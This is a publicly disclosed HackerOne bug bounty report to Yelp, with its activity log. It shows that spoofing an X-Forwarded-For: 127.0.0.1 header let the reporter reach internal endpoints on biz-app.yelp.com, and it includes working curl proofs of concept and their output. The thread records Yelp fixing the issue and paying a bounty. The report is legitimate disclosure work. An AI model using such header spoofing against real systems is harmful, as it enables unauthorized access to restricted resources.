{"id":1011767,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDExNzY3","url":"https://hackerone.com/reports/1011767","title":"X-Forward-For Header allows to bypass access restrictions","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-10-19T12:30:08.920Z","submitted_at":"2020-10-19T12:30:08.985Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"parzel","url":"/parzel","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":545,"url":"https://hackerone.com/yelp","handle":"yelp","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Yelp","twitter_handle":"","website":"https://www.yelp.com","about":"Connecting people to great local businesses in communities around the world."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-10-26T18:22:01.346Z","bug_reporter_agreed_on_going_public_at":"2020-10-25T14:45:32.529Z","team_member_agreed_on_going_public_at":"2020-10-26T18:22:01.220Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nIf the \"X-Forward-For: 127.0.0.1\" header is used, it allows to bypass restrictions of the web application and access endpoints that are restricted otherwise. This allows for example to access the \"Business Owner App backend API\". The responding server thinks, he is accessed by an internal IP.\n\n## Platform(s) Affected:\nWebsite: https://biz-app.yelp.com\n\n## Steps To Reproduce:\nPOC1:\n```\n➜  /tmp curl -k https://biz-app.yelp.com/status                                \n\n{\"error\": {\"id\": \"PredicateMismatch\"}}%                                                                                                                                   \n➜  /tmp curl -k https://biz-app.yelp.com/status -H \"X-Forwarded-For: 127.0.0.1\"\n\n{\"host\": \"biz--app-main--useast1-74dd77b89b-fgtdk\", \"health\": {}, \"mem_vsz\": 1111.61328125, \"mem_rss\": 410.0, \"pid\": 91941, \"uptime\": 178784.86051034927, \"version\": null}\n```\n\nPOC2:\n```\n➜  /tmp curl -k https://biz-app.yelp.com/swagger.json                                                                                                                                                                \n{\"error\": {\"id\": \"HTTPNotFound\"}}%                                                                                                                                                                                   \n➜  /tmp curl -k https://biz-app.yelp.com/swagger.json -H \"X-Forwarded-For: 127.0.0.1\"                                                                                                                                                                                                                                                                                                                            \n█████\n█████\n███████\n█████████\n████\n███\n████\n██████\n█████████ \n██████████ [...]\n```\n\nThe responding server thinks, it is accessed by an internal IP as can be seen in the headers:\n```\nHTTP/1.1 200 OK\nConnection: close\nserver: openresty/1.13.6.2\ncontent-type: application/json\nx-b3-sampled: 0\nx-is-internal-ip-address: true\nx-zipkin-id: 2fce61c10ade1e32\nx-routing-service: routing-main--useast1-d84b86b87-cwstn; site=biz_app\nx-mode: ro\nx-proxied: 10-65-64-83-useast1aprod\nx-extlb: 10-65-64-83-useast1aprod\nAccept-Ranges: bytes\nDate: Mon, 19 Oct 2020 12:21:19 GMT\nVia: 1.1 varnish\nX-Served-By: cache-hhn4033-HHN\nX-Cache: MISS\nX-Cache-Hits: 0\nContent-Length: 573093\n```\n\n## Impact\n\nAs the attacker is seen as having an internal IP he is able to access resources which should otherwise be restricted for him.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-11-24T14:45:32.602Z","allow_singular_disclosure_after":-27729068.506983288,"singular_disclosure_allowed":true,"vote_count":63,"voters":["candoe","m0chan","rahulkadavil_","ms-13","dmc3","meryem0x","sodium_","3x3s","demonia","hell1337","and 53 more..."],"severity":{"rating":"medium","score":6.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":44096,"asset_type":"URL","asset_identifier":"biz-app.yelp.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9563522,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there!\n\nThanks for submitting your report to us! Please expect a response within a week.\n\nBest,\nThe Yelp Security Team\n","automated_response":true,"created_at":"2020-10-19T12:30:09.866Z","updated_at":"2020-10-19T12:30:09.866Z","actor":{"url":"/yelp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Yelp"}},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9566538,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi there!\n\nThanks for submitting your report to us!\n\nWe are investigating the reported issue and will update this thread once we have further details.\n\nBest,\nThe Yelp Security Team","automated_response":false,"created_at":"2020-10-19T17:42:29.640Z","updated_at":"2020-10-19T17:42:29.640Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9583334,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @parzel,\n\nWe've updated these endpoints so that the `X-Forwarded-For` header should not be able to affect whether we serve the real content or serve an error for this service. Can you verify that our fix works?\n\nBest,\nThe Yelp Security Team","automated_response":false,"created_at":"2020-10-21T00:33:41.701Z","updated_at":"2020-10-21T00:33:41.701Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9585029,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @vzhou,\n\nI verified the fix and I think it is working properly.\n\nCheers,\n@parzel ","automated_response":false,"created_at":"2020-10-21T07:16:54.573Z","updated_at":"2020-10-21T07:16:54.573Z","actor":{"username":"parzel","cleared":false,"url":"/parzel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9595539,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @parzel,\n\nThanks for verifying the fix! I will now close this issue as resolved, and award you a bounty amount of $200.\n\nWe appreciate your diligent effort in this matter, and encourage you to keep banging away on the Yelps. Thanks for helping keep our users safe!\n\nBest,\nThe Yelp Security Team","automated_response":false,"created_at":"2020-10-21T18:32:40.948Z","updated_at":"2020-10-21T18:32:40.948Z","actor":{"url":"/yelp","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Yelp"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"yelp","collaborator":{"username":"parzel","url":"/parzel"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9595543,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-10-21T18:33:09.376Z","updated_at":"2020-10-21T18:33:09.376Z","additional_data":{"old_severity":"High","new_severity":"Medium (6.1)","old_severity_id":880642,"new_severity_id":884799},"actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9595544,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-10-21T18:33:13.279Z","updated_at":"2020-10-21T18:33:13.279Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"parzel","url":"/parzel"},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9628721,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose this?","automated_response":false,"created_at":"2020-10-25T14:45:32.561Z","updated_at":"2020-10-25T14:45:32.561Z","first_to_agree":true,"actor":{"username":"parzel","cleared":false,"url":"/parzel","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/kAVxjQwjsERoJp9eMTQEwZD1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9639510,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-26T18:22:01.251Z","updated_at":"2020-10-26T18:22:01.251Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9639511,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-26T18:22:01.386Z","updated_at":"2020-10-26T18:22:01.386Z","actor":{"username":"vzhou","cleared":false,"url":"/vzhou","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"yelp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}